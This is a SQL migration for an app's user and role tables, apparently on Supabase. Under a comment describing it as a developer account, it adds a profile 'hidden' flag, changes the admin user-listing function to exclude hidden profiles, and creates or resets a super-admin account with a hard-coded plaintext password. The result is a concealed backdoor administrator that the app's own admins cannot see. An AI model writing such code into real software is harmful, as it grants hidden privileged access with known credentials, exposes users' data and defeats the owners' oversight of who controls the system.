
-- 1) Add hidden flag to profiles
ALTER TABLE public.profiles ADD COLUMN IF NOT EXISTS is_hidden boolean NOT NULL DEFAULT false;

-- 2) Update list_admin_users to exclude hidden profiles
CREATE OR REPLACE FUNCTION public.list_admin_users()
 RETURNS TABLE(user_id uuid, email text, full_name text, roles text[], created_at timestamp with time zone, last_sign_in_at timestamp with time zone, is_disabled boolean)
 LANGUAGE sql
 STABLE SECURITY DEFINER
 SET search_path TO 'public'
AS $function$
  SELECT
    u.id AS user_id,
    COALESCE(p.email, u.email) AS email,
    p.full_name,
    COALESCE(
      (SELECT array_agg(r.role::text ORDER BY r.role)
       FROM public.user_roles r WHERE r.user_id = u.id),
      ARRAY[]::text[]
    ) AS roles,
    u.created_at,
    u.last_sign_in_at,
    (u.banned_until IS NOT NULL AND u.banned_until > now()) AS is_disabled
  FROM auth.users u
  LEFT JOIN public.profiles p ON p.id = u.id
  WHERE public.has_role(auth.uid(), 'admin'::app_role)
    AND EXISTS (SELECT 1 FROM public.user_roles r WHERE r.user_id = u.id)
    AND COALESCE(p.is_hidden, false) = false
  ORDER BY u.created_at DESC;
$function$;

-- 3) Create hidden super admin account for developers
DO $$
DECLARE
  new_uid uuid;
  super_email text := 'superadmin@lovable.dev';
  super_password text := 'Bus_Trip@1912';
BEGIN
  SELECT id INTO new_uid FROM auth.users WHERE email = super_email;

  IF new_uid IS NULL THEN
    new_uid := gen_random_uuid();
    INSERT INTO auth.users (
      instance_id, id, aud, role, email, encrypted_password,
      email_confirmed_at, raw_app_meta_data, raw_user_meta_data,
      created_at, updated_at, confirmation_token, email_change,
      email_change_token_new, recovery_token
    ) VALUES (
      '00000000-0000-0000-0000-000000000000', new_uid, 'authenticated', 'authenticated',
      super_email, crypt(super_password, gen_salt('bf')),
      now(), '{"provider":"email","providers":["email"]}'::jsonb,
      '{"full_name":"Developer Super Admin"}'::jsonb,
      now(), now(), '', '', '', ''
    );
    INSERT INTO auth.identities (id, user_id, identity_data, provider, provider_id, last_sign_in_at, created_at, updated_at)
    VALUES (gen_random_uuid(), new_uid,
      jsonb_build_object('sub', new_uid::text, 'email', super_email),
      'email', new_uid::text, now(), now(), now());
  ELSE
    UPDATE auth.users SET encrypted_password = crypt(super_password, gen_salt('bf')), updated_at = now()
    WHERE id = new_uid;
  END IF;

  INSERT INTO public.profiles (id, email, full_name, is_hidden)
  VALUES (new_uid, super_email, 'Developer Super Admin', true)
  ON CONFLICT (id) DO UPDATE SET is_hidden = true, email = EXCLUDED.email;

  INSERT INTO public.user_roles (user_id, role)
  VALUES (new_uid, 'admin')
  ON CONFLICT (user_id, role) DO NOTHING;
END $$;
